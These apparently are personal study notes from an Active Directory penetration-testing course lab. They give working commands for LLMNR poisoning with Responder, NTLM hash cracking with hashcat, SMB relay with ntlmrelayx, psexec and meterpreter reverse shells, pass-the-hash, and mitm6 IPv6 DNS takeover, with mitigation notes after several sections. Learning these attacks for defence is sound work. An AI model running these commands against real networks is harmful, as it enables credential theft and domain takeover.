## LLMNR poisoning overview

Protocol Used to identift hist when DNS resolution is impossible.
We can intercept traffic in a network containing username and hash

sudo responder -I eth0 -dwP

## Capturing hashes with Responder

sudo responder -I eth0 -dwP
-d answer for DHCP broadcast request
-w wpad rogue proxy server. It allows browser to automatically detect proxy
-P force authentication for the proxy

From target machine we try to reach attacker from file explorer \\192.168.138.134
We get ntml hash

## Cracking our captured hash

Copy full hash, paste it in a file to crack it using hashcat.
If hash is unknown use 'hash-identifieer'

hashcat --help | grep ntlm

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show to only show cracked password

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force to force hashcat

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r OneRule to mutate the used password from our wordlist

## LLMNR poisoning mitigation

Group Policy Management > Computer configuration > Policies > Administrative Template > Network > Dns CLient> Turn off multicast name resolution

We can require to have LLMNR but add permission settings, based on MAC address as example, or require complex password policy

## SMB Relay Attacks Overview

Relay the hash via SMB instead of cracking haches.
To work SMB signing must be disabled or not enforced on the target
Relayed user credentials must be admin on machine for any real value for us

We can identify host wihtout SMB signing using 
nmap --script=smb2-security-mode.nse -p445 10.0.0.25

To enbale this attack we must modify Responder conf (/etc/responder/Responder.conf) to turn off SMB and HTTP servers as we want to be able to relay hashes and not capture.

Once Responder is running we will run another tool called ntlmrelayx.py
ntlmrelayx -tf targets.txt -smb2support
targets.txt contains the host we identify with nmap as SMB relayable

Can also use :
ntlmrelayx -tf targets.txt -smb2support -I
-I enables to get an interactive shell to browse shares (#shares, # use ADMIN$, #ls)

Or execute commands
ntlmrelayx -tf targets.txt -smb2support -c "whoami"

## SMB Relay Attacks Lab

nmap --script=smb2-security-mode.nse -p445 10.0.0.25 -Pn
-Pn is used when we know machine is live but nmap does not see it. It skips host discovery

Change Responder conf as stated before. 
Check changes :
sudo responder -I eth0 -dwPv
HTPP and SMB must be OFF

We set up ntlmrelayx (available under pimp my kali)
ntlmrelayx -tf targets.txt -smb2support
Working version is v0.9.19, not older and not newer

We can redo in interactive mode:
ntlmrelayx -tf targets.txt -smb2support -i
It starts a SMB client on localhost port 11000
We can connect to it using Netcat (nc) after relaying 
nc 127.0.0.1 11000

Execute whoami command :
ntlmrelayx -tf targets.txt -smb2support -c "whoami"

## SMB Relay Attack Defenses
- Enable SMB signing on all devices : can cause performance issue with file copies
- Disable NTLM authentication on network : default back to NTLM if Kerberos stops working
- Account tiering
- Local admin restriction : limit attack surface with local admin abuse but can increase the amount of desk ticket if no admin rights is available for the user

## Gaining Shelle Access

Can get a shell using msfconsole using exploit psexec
Using metasploit is noisy (exploit/windows/smb/psexec). But we can use psexec.py tool
Use 4
set payload windows/x64/meterpreter/reverse_tcp //change payload to discard 32 bits and take 64 bits
options
set RHOSTS 192.168.138.137
set smbdomain MARVEL.local
set smbuser fcastle
set smbpass Password1

show targets // list different targets, can be changed
run
background //run in background to come back later
sessions // list all backgrounds
sessions 1 //go back to session 1

Now we want to realise a hash attack
options
Instead of a domaine we will set the smduser as administrator
set smbuser adminsitrator
unset smbdomain
set smbpass HASH // Hash is the LM and NT hash LM_hash:NT_hash
run

We can also do this manually without metasploit
psexec.py MARVEL/fcastle:'Password1'@192.168.138.137 // DOMAIN/user:'password'@IP_address

Using a hash :
psexec.y adminsitrator@192.168.138.137 -hashes LM_hash:NT_hash

If psexec is not working or blocket by antivirus we can try wmiexec.py or smbexec.py using the same parameters

## IPv6 Attacks Overview

Computers may have IPv6 is turned on but using IPv4. So who is doing DNS for IPv6 ? No one
So we can try DNS spoofing for IPv6 to use a machine to log into the domain controller to get information and realise LDAP relay.

## IPv6 DNS Takeover via mitm6

Attack undetectable, and can be realised without no access.

cd /opt/mitm6
sudo pip2 install .

sudo mitm6 -d marvel.local

We set up ntlm relay using mitm6 instead of responder
ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
-6 : IPv6
-t : target
-wh : set up wpad (machine in the middle, part of the domain)
-l : loop (no name meaning expected)

Once relaying is set up, run mitm6
sudo mitm6 -d marvel.local

In our running folder we now have a 'lootme' folder containing different informations such as machines in the domain, groups within the domaine, domain users

Back to Kali, logging is also an event. We logging from a client machine as administrator
During the logging mitm created a new user, credentials are in the terminal
On the DC we check that the user is created, he is member of Domain Users so he does not have access to every single computer in the domain but have access to the Enterprise Admins group and have access to run secrets dump againt the domain, get domain user's hashes

## IPv6 Attack Defenses

- Disable IPv6 internally, or block some traffic (inbound dynamic host configuration protocol for IPv6, inbound router advertisement, outbound dynamic host configuration protocol for IPv6)
- If WPAD is not use internally, disable it via a GPO
- Enbale LDAP signing and LDAP channel binding to avoid relaying to LDAP
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive so they cannot be delegated to avoid impersonation